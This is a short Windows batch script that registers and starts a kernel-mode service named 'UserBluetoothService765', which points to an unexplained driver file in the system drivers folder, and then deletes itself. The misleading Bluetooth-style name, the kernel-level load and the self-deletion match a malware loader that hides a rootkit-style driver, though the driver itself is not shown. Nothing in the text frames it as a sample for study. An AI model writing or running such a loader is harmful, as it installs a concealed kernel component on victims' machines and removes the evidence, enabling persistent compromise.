@echo off
cd %~dp0
sc create UserBluetoothService765 binpath=C:\Windows\System32\drivers\mspqmw.sys type=kernel
sc start UserBluetoothService765
del "%~f0"